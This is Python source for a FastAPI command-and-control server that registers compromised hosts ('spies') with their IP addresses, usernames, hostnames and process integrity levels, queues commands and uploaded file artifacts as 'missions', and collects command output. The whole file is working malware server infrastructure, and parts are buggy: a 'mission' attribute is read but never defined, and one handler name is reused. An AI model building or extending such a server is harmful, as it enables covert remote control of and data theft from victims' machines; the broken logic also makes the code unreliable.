from fastapi import FastAPI, HTTPException, UploadFile, File, Form
from pydantic import BaseModel
import itertools
import random
import string
from datetime import datetime
import base64
import json

# Class for requests
class RegisterRequest(BaseModel):
    intaddr: str
    extaddr: str
    username: str
    hostname: str
    ops: str
    pid: int
    processname: str
    integritylevel: str
    arch: str


class BeaconRequest(BaseModel):
    id: int
    active: bool
    
class MissionRequest(BaseModel):
    command: str

class MissionUpdateRequest(BaseModel):
    output: str
    



# Class for server objects
class Server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

class Spy:
    newId = itertools.count(start=1)
    def __init__(self):
        self.id = next(self.newId)
        self.guid = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
        self.active = False
        self.intaddr = None
        self.extaddr = None
        self.username = None
        self.hostname = None
        self.ops = None
        self.pid = None
        self.firstcheckin = None
        self.lastcheckin = None
        self.missionlist = []
        self.processname = None
        self.integritylevel = None
        self.arch = None

    def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid, processname, integritylevel, arch):
        self.active = True
        self.intaddr = intaddr
        self.extaddr = extaddr
        self.username = username
        self.hostname = hostname
        self.ops = ops
        self.pid = pid
        self.firstcheckin = datetime.now()
        self.lastcheckin = self.firstcheckin
        self.processname = processname
        self.integritylevel = integritylevel

    def checkin(self):
        self.lastcheckin = datetime.now()
        if self.mission is not None and self.mission == 'kill':
            self.active = False

class Listener:
    def __init__(self, type, name, bindport):
        self.type=type
        self.name=name
        self.bindport=bindport

class Operator:
    def __init__(self, name, role):
        self.name = name
        self.role = role

class Mission:
    newId = itertools.count(start=1)
    def __init__(self, spyid, command, artifact):
        self.id = next(self.newId)
        self.spyid = spyid
        self.command = command
        self.artifact = artifact
        self.iscompleted = False
        self.output = ""
        self.isviewed = False

    def update_mission(self,iscompleted, output, isviewed):
        self.iscompleted = iscompleted
        self.output = output
        self.isviewed = isviewed



spies = []
operator = []
listener = []

app = FastAPI()

@app.post("/register")
async def register(request: RegisterRequest):
    newspy = Spy()
    newspy.initial_checkin(request.intaddr, request.extaddr, request.username, request.hostname, request.ops, request.pid, request.processname, request.integritylevel, request.arch)
    spies.append(newspy)
    return newspy.__dict__

@app.post("/beacon")
async def beacon(request: BeaconRequest):
    spy = next((s for s in spies if s.id == request.id), None)
    if spy:
        spy.active = request.active
        spy.lastcheckin = datetime.now()
        if spy.mission:
            mission = spy.mission
            spy.mission = None
            return {"command": mission}
        return {"command": None}
    raise HTTPException(status_code=404, detail="Spy not found")


@app.get("/spies")
async def list_spies():
    return [spy.__dict__ for spy in spies]


@app.post("/mission/{spy_id}")
async def receive_mission(spy_id: int, json_data: str = Form(...), file: UploadFile = None):
    spy = next((s for s in spies if s.id == spy_id), None)
    if spy:
        try:
            data = json.loads(json_data)
            command = data['command']
        except json.JSONDecodeError:
            raise HTTPException(status_code=400, detail="Invalid JSON format")
        content = b""
        if file:
            filename = file.filename
            content = await file.read()
        artifact = base64.b64encode(content).decode("utf-8")  
        m = Mission(spy_id, command, artifact)
        spy.missionlist.insert(0,m)        
        return m.__dict__
    raise HTTPException(status_code=404, detail="Spy not found")


@app.get("/spy/{spy_id}")
async def check_in(spy_id: int):
    spy = next((s for s in spies if s.id == spy_id), None)
    if spy:
        spy.lastcheckin = datetime.now()
        return spy.__dict__
    raise HTTPException(status_code=404, detail="Spy not found")


@app.post("/spy/{spy_id}/{mission_id}/output")
async def update_output(spy_id: int, mission_id: int, request: MissionUpdateRequest):
    spy = next((s for s in spies if s.id == spy_id), None)
    if spy:
        mission = next((m for m in spy.missionlist if m.id == mission_id), None)
        if mission:
            mission.output = request.output
            mission.iscompleted = True
            mission.artifact = "Cleared"
            return {"message": "Updated output successfully"}
    raise HTTPException(status_code=404, detail="Spy not found")


@app.get("/spy/{spy_id}/{mission_id}/output")
async def update_output(spy_id: int, mission_id: int):
    spy = next((s for s in spies if s.id == spy_id), None)
    if spy:
        mission = next((m for m in spy.missionlist if m.id == mission_id), None)
        if mission:
            mission.isviewed = True
            return {"output": mission.output}
    raise HTTPException(status_code=404, detail="Spy not found")






if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
